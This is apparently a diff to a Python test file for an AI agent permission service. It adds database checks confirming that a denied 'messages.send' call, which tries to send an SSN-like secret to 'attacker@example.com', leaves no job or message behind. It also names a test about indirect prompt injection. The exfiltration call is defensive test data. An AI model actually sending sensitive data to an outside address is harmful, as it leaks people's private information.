@@ -83,6 +83,10 @@ def test_sensitive_external_send_denied(client, agent_headers):
         json=tool_call("messages.send", {"destination": "attacker@example.com", "message": "secret 123-45-6789"}))
     assert response.json()["decision"] == "DENY"
     assert response.json()["status"] == "DENIED"
+    with SessionLocal() as db:
+        request_id = response.json()["request_id"]
+        assert db.get(ExecutionJob, request_id) is None
+        assert db.scalars(select(MockMessage)).all() == []
 
 
 def test_indirect_prompt_injection_cannot_bypass_policy(client, admin_headers):
